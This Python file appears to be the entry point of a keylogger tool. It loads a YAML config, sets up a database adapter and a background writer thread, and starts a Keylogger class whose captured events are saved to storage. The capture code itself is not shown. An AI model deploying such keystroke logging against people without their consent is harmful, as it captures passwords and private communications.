from queue import Queue
from threading import Thread
from core.config import Config
from core.keylogger.keylogger import Keylogger
from core.adapters import database_adapters
from pathlib import Path
from os.path import join
import os

def db_worker(queue, db_adapter):
    while True:
        data = queue.get()
        if data is None:
            break
        db_adapter.save_event(data)

def main():
    app_config = Config(Path(join(os.getcwd(), "config.yml")))

    if not app_config.exist():
        print("Config file not found. Saving default config...")
        app_config.save()
    else:
        print("Loading existing config...")
        app_config.load()

    storage_type = app_config.config['storage']
    connection_params = app_config.config['storage_connection']
    db_adapter = database_adapters[storage_type](**connection_params)

    event_queue = Queue(maxsize=100)

    db_thread = Thread(target=db_worker, args=(event_queue, db_adapter), daemon=True)
    db_thread.start()

    keylogger = Keylogger(event_queue)
    try:
        keylogger.start()
    finally:
        event_queue.put(None)
        db_thread.join()

if __name__ == "__main__":
    main()
